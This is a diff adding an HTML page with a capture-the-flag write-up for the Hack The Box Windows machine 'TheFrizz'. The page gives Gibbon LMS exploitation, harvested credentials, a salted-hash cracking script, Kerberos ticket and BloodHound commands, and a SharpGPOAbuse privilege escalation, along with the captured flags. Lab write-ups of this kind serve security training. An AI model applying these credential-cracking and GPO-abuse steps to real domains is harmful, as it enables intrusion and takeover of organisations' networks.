@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TheFrizz Writeup - 0xProfound</title>
+    <link rel="stylesheet" href="../assets/css/main.css">
+    <link rel="stylesheet" href="../assets/css/animations.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .writeup-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        
+        .writeup-header {
+            text-align: center;
+            margin-bottom: 3rem;
+            padding: 3rem 0;
+            border-bottom: 2px solid #333;
+        }
+        
+        .writeup-title {
+            color: var(--primary-color);
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            text-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+        }
+        
+        .writeup-meta {
+            color: var(--text-light);
+            font-size: 1.1rem;
+            margin-bottom: 2rem;
+        }
+        
+        .writeup-content {
+            line-height: 1.8;
+            font-size: 1.1rem;
+        }
+        
+        .writeup-section {
+            margin-bottom: 3rem;
+            padding: 2rem;
+            background: rgba(0, 0, 0, 0.7);
+            border: 2px solid #333;
+            border-radius: 15px;
+            transition: all 0.3s ease;
+        }
+        
+        .writeup-section:hover {
+            border-color: var(--primary-color);
+            box-shadow: 0 10px 30px rgba(0, 255, 0, 0.2);
+        }
+        
+        .section-title {
+            color: var(--primary-color);
+            font-size: 2rem;
+            margin-bottom: 1.5rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid #333;
+        }
+        
+        .subsection-title {
+            color: var(--primary-color);
+            font-size: 1.5rem;
+            margin: 1.5rem 0 1rem 0;
+        }
+        
+        .nmap-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #333;
+        }
+        
+        .nmap-table th {
+            background: rgba(0, 255, 0, 0.1);
+            color: var(--primary-color);
+            padding: 1rem;
+            text-align: left;
+            border: 1px solid #333;
+        }
+        
+        .nmap-table td {
+            padding: 0.8rem;
+            border: 1px solid #333;
+            color: var(--text-color);
+        }
+        
+        .nmap-table tr:hover {
+            background: rgba(0, 255, 0, 0.05);
+        }
+        
+        .code-block {
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #333;
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            position: relative;
+        }
+        
+        .code-block pre {
+            margin: 0;
+            color: var(--primary-color);
+        }
+        
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: rgba(0, 255, 0, 0.1);
+            color: var(--primary-color);
+            border: 1px solid var(--primary-color);
+            border-radius: 5px;
+            padding: 0.5rem;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+        }
+        
+        .copy-btn:hover {
+            background: rgba(0, 255, 0, 0.2);
+        }
+        
+        .cred-box {
+            background: rgba(0, 255, 0, 0.1);
+            border: 2px solid var(--primary-color);
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        
+        .cred-item {
+            margin: 0.5rem 0;
+            font-family: 'Courier New', monospace;
+            color: var(--primary-color);
+        }
+        
+        .flag-box {
+            background: rgba(0, 255, 0, 0.15);
+            border: 2px solid var(--primary-color);
+            border-radius: 10px;
+            padding: 2rem;
+            margin: 2rem 0;
+            text-align: center;
+        }
+        
+        .flag-text {
+            font-family: 'Courier New', monospace;
+            color: var(--primary-color);
+            font-size: 1.2rem;
+            word-break: break-all;
+        }
+        
+        .timeline {
+            border-left: 3px solid var(--primary-color);
+            margin: 2rem 0;
+            padding-left: 2rem;
+        }
+        
+        .timeline-item {
+            margin-bottom: 2rem;
+            position: relative;
+        }
+        
+        .timeline-item:before {
+            content: '';
+            position: absolute;
+            left: -2.5rem;
+            top: 0.5rem;
+            width: 1rem;
+            height: 1rem;
+            background: var(--primary-color);
+            border-radius: 50%;
+            box-shadow: 0 0 10px var(--primary-color);
+        }
+        
+        @media (max-width: 768px) {
+            .writeup-title {
+                font-size: 2rem;
+            }
+            
+            .writeup-container {
+                padding: 1rem;
+            }
+            
+            .nmap-table {
+                font-size: 0.9rem;
+            }
+            
+            .code-block {
+                padding: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    
+    <!-- Navigation -->
+    <header>
+        <nav class="nav-container">
+            <div class="nav-brand">
+                <a href="../index.html" class="logo-link">
+                    <span class="logo-text">0xProfound</span>
+                </a>
+            </div>
+            
+            <button class="mobile-menu-btn" id="mobileMenuBtn" aria-label="Toggle navigation">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="../index.html" class="nav-link">Home</a></li>
+                <li><a href="../index.html#terminal" class="nav-link">Terminal</a></li>
+                <li><a href="../pages/about.html" class="nav-link">About</a></li>
+                <li><a href="../index.html#skills" class="nav-link">Skills</a></li>
+                <li><a href="../pages/machines.html" class="nav-link">HTB Machines</a></li>
+                <li><a href="../writeups/index.html" class="nav-link">Writeups</a></li>
+                <li><a href="../blog/index.html" class="nav-link">Blog</a></li>
+                <li><a href="../projects/index.html" class="nav-link">Projects</a></li>
+                <li><a href="../pages/timeline.html" class="nav-link">Journey</a></li>
+                <li><a href="../pages/tools.html" class="nav-link">Tools</a></li>
+                <li><a href="../pages/contact.html" class="nav-link">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <div class="writeup-container">
+            <!-- Header -->
+            <div class="writeup-header">
+                <h1 class="writeup-title">TheFrizz</h1>
+                <div class="writeup-meta">
+                    <span><i class="fas fa-signal"></i> Medium Difficulty</span>
+                    <span style="margin: 0 1rem;">•</span>
+                    <span><i class="fab fa-windows"></i> Windows</span>
+                    <span style="margin: 0 1rem;">•</span>
+                    <span><i class="fas fa-calendar"></i> Solved: 2025-07-05</span>
+                </div>
+            </div>
+
+            <!-- Content -->
+            <div class="writeup-content">
+                <!-- Enumeration Section -->
+                <div class="writeup-section">
+                    <h2 class="section-title">Enumeration</h2>
+                    
+                    <h3 class="subsection-title">Nmap Scan</h3>
+                    <table class="nmap-table">
+                        <thead>
+                            <tr>
+                                <th>PORT</th>
+                                <th>STATE</th>
+                                <th>SERVICE</th>
+                                <th>VERSION</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH for Windows 9.5</td></tr>
+                            <tr><td>53/tcp</td><td>open</td><td>domain</td><td>Simple DNS Plus</td></tr>
+                            <tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.58</td></tr>
+                            <tr><td>88/tcp</td><td>open</td><td>kerberos-sec</td><td>Microsoft Windows Kerberos</td></tr>
+                            <tr><td>135/tcp</td><td>open</td><td>msrpc</td><td>Microsoft Windows RPC</td></tr>
+                            <tr><td>139/tcp</td><td>open</td><td>netbios-ssn</td><td>Microsoft Windows netbios-ssn</td></tr>
+                            <tr><td>389/tcp</td><td>open</td><td>ldap</td><td>Microsoft Windows Active Directory LDAP</td></tr>
+                            <tr><td>445/tcp</td><td>open</td><td>microsoft-ds</td><td></td></tr>
+                            <tr><td>464/tcp</td><td>open</td><td>kpasswd5</td><td></td></tr>
+                            <tr><td>593/tcp</td><td>open</td><td>ncacn_http</td><td>Microsoft Windows RPC over HTTP</td></tr>
+                            <tr><td>636/tcp</td><td>open</td><td>tcpwrapped</td><td></td></tr>
+                            <tr><td>3268/tcp</td><td>open</td><td>ldap</td><td>Microsoft Windows Active Directory LDAP</td></tr>
+                            <tr><td>3269/tcp</td><td>open</td><td>tcpwrapped</td><td></td></tr>
+                        </tbody>
+                    </table>
+
+                    <h3 class="subsection-title">Web Page Analysis</h3>
+                    <p>The website redirected to <code>http://frizzdc.frizz.htb/home/</code> and was running Gibbon v25.0.00. Investigation revealed:</p>
+                    <ul>
+                        <li>Login form potentially vulnerable to brute-force</li>
+                        <li>LFI vulnerability in the <code>q</code> parameter</li>
+                        <li>CVE-2023-45878 exploit leading to initial access</li>
+                    </ul>
+                </div>
+
+                <!-- Initial Access Section -->
+                <div class="writeup-section">
+                    <h2 class="section-title">Initial Access</h2>
+                    
+                    <h3 class="subsection-title">Gibbon LMS Exploitation</h3>
+                    <p>Exploiting CVE-2023-45878 provided initial access as <code>w.webservice</code>:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre>PS C:\xampp\htdocs\Gibbon-LMS> net user /domain
+
+User accounts for \\FRIZZDC
+
+a.perlstein    Administrator    c.ramon
+c.sandiego    d.hudson    f.frizzle
+g.frizzle    Guest    h.arm
+J.perlstein    k.franklin    krbtgt
+l.awesome    m.ramon    M.SchoolBus
+p.terset    r.tennelli    t.wright
+v.frizzle    w.li    w.Webservice</pre>
+                    </div>
+
+                    <h3 class="subsection-title">Database Credentials Extraction</h3>
+                    <p>Found database credentials in configuration files:</p>
+                    
+                    <div class="cred-box">
+                        <div class="cred-item"><strong>Database Server:</strong> localhost</div>
+                        <div class="cred-item"><strong>Username:</strong> MrGibbonsDB</div>
+                        <div class="cred-item"><strong>Password:</strong> MisterGibbs!Parrot!?</div>
+                        <div class="cred-item"><strong>Database:</strong> gibbon</div>
+                    </div>
+
+                    <h3 class="subsection-title">Password Cracking</h3>
+                    <p>Extracted and cracked password hash using custom Python script:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre>import hashlib
+
+HASH_TO_CRACK = "067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03"
+SALT = "/aACFhikmNopqrRTVz2489"
+WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt"
+
+def crack_password():
+    try:
+        with open(WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as file:
+            for line in file:
+                password = line.strip()
+                test_hash = hashlib.sha256((SALT + password).encode()).hexdigest()
+                if test_hash == HASH_TO_CRACK:
+                    print(f"✔ Password found: {password}")
+                    return
+        print("✗ Password not found in wordlist.")
+    except FileNotFoundError:
+        print(f"▲ Wordlist file not found: {WORDLIST_PATH}")
+
+if __name__ == "__main__":
+    crack_password()</pre>
+                    </div>
+
+                    <p>Discovered credentials: <strong>f.frizzle:Jenni_Luvs_Magic23</strong></p>
+                </div>
+
+                <!-- Privilege Escalation Section -->
+                <div class="writeup-section">
+                    <h2 class="section-title">Privilege Escalation</h2>
+                    
+                    <h3 class="subsection-title">Kerberos Ticket Generation</h3>
+                    <p>Generated TGT ticket for f.frizzle:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre>faketime "$(ntpdate -q frizzdc.frizz.htb | cut -d ' ' -f 1,2)" getTGT.py -dc-ip 10.10.11.60 frizz.htb/f.frizzle:Jenni_Luvs_Magic23</pre>
+                    </div>
+
+                    <h3 class="subsection-title">SSH Access</h3>
+                    <p>Used Kerberos authentication to gain SSH access:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre>kinit f.frizzle@FRIZZ.HTB
+klist
+ssh f.frizzle@FRIZZ.HTB -K</pre>
+                    </div>
+
+                    <h3 class="subsection-title">WAPT Configuration Analysis</h3>
+                    <p>Discovered WAPT (Windows Application Package Toolkit) configuration files containing credentials:</p>
+                    
+                    <div class="cred-box">
+                        <div class="cred-item"><strong>Password Found:</strong> !suBcig@MehTed!R</div>
+                        <div class="cred-item"><strong>User:</strong> M.SchoolBus</div>
+                    </div>
+
+                    <h3 class="subsection-title">BloodHound Enumeration</h3>
+                    <p>Used BloodHound to discover attack paths:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre>faketime "$(ntpdate -q frizzdc.frizz.htb | cut -d ' ' -f 1,2)" nxc ldap frizzdc.frizz.htb -u M.SchoolBus -p '!suBcig@MehTed!R' -k --bloodhound --collection All --dns-server 10.10.11.60</pre>
+                    </div>
+
+                    <p>Discovered <strong>WriteGPLink</strong> permission over <code>Class_frizz</code> OU, enabling GPO abuse.</p>
+
+                    <h3 class="subsection-title">GPO Abuse</h3>
+                    <p>Abused GPO permissions to gain administrative access:</p>
+                    
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <pre># Create evil GPO
+New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB"
+
+# Add local admin
+SharpGPOAbuse.exe --AddLocalAdmin --UserAccount Administrator --GPOName "Evil GPO"
+
+# Force GPO update
+gpupdate /force</pre>
+                    </div>
+                </div>
+
+                <!-- Flags Section -->
+                <div class="writeup-section">
+                    <h2 class="section-title">Flags Captured</h2>
+                    
+                    <div class="flag-box">
+                        <h3 class="subsection-title">User Flag</h3>
+                        <div class="flag-text">4e935daea827fa3dce85e21bae8fcadf</div>
+                    </div>
+
+                    <div class="flag-box">
+                        <h3 class="subsection-title">Root Flag</h3>
+                        <div class="flag-text">412b3f21dcf8a20f0875a56c8fb77c51</div>
+                    </div>
+                </div>
+
+                <!-- Timeline Section -->
+                <div class="writeup-section">
+                    <h2 class="section-title">Attack Timeline</h2>
+                    
+                    <div class="timeline">
+                        <div class="timeline-item">
+                            <h4 class="subsection-title">Phase 1: Enumeration</h4>
+                            <p>Nmap scan → Web application analysis → LFI discovery → CVE-2023-45878 exploitation</p>
+                        </div>
+                        
+                        <div class="timeline-item">
+                            <h4 class="subsection-title">Phase 2: Initial Access</h4>
+                            <p>Database credentials extraction → Password cracking → Kerberos ticket generation → SSH access</p>
+                        </div>
+                        
+                        <div class="timeline-item">
+                            <h4 class="subsection-title">Phase 3: Privilege Escalation</h4>
+                            <p>WAPT configuration analysis → BloodHound enumeration → GPO abuse → Domain admin access</p>
+                        </div>
+                        
+                        <div class="timeline-item">
+                            <h4 class="subsection-title">Phase 4: Exfiltration</h4>
+                            <p>Flag capture → Proof collection</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="section-container">
+            <!-- Footer content from your main site -->
+        </div>
+    </footer>
+
+    <script>
+        // Copy code functionality
+        function copyCode(button) {
+            const codeBlock = button.nextElementSibling;
+            const textArea = document.createElement('textarea');
+            textArea.value = codeBlock.textContent;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+            
+            // Visual feedback
+            const originalText = button.textContent;
+            button.textContent = 'Copied!';
+            setTimeout(() => {
+                button.textContent = originalText;
+            }, 2000);
+        }
+
+        // Mobile menu functionality
+        document.addEventListener('DOMContentLoaded', function() {
+            const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+            const navMenu = document.getElementById('navMenu');
+
+            if (mobileMenuBtn && navMenu) {
+                mobileMenuBtn.addEventListener('click', function() {
+                    mobileMenuBtn.classList.toggle('active');
+                    navMenu.classList.toggle('active');
+                });
+            }
+        });
+    </script>
+    
+    <script src="../assets/js/particles.js"></script>
+</body>
+</html>
